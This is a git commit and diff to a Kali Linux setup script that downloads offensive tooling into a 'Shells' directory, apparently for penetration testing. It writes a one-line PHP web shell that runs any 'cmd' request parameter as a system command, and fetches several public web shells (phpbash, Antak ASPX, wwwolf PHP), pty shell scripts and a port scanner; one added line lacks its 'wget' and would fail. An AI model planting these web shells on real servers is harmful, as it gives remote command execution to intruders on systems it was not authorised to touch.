ca14795173c2703d49e645e71f1696518252100e
R0gueSec <143247134+R0gueSec@users.noreply.github.com>
2025-03-18 22:24:52 -0700

    Update kali-transfertools.sh
    Added these lines to 229 and 230:
    
    wget https://raw.githubusercontent.com/xl7dev/WebShell/refs/heads/master/Aspx/Antak%20Webshell.aspx
    https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php

--- kali-transfertools.sh
+++ kali-transfertools.sh
@@ -226,6 +226,8 @@ cd Shells
 cp -r /usr/share/webshells/ .
 echo '<?php system($_REQUEST['cmd']); ?>' > shell.php
 wget https://raw.githubusercontent.com/Arrexel/phpbash/refs/heads/master/phpbash.php
+wget https://raw.githubusercontent.com/xl7dev/WebShell/refs/heads/master/Aspx/Antak%20Webshell.aspx
+https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php
 wget https://github.com/R0gueSec/ToolsDownloaders/releases/download/PDF/StabilizingShellwithPython.pdf
 git clone https://github.com/infodox/python-pty-shells.git
 wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
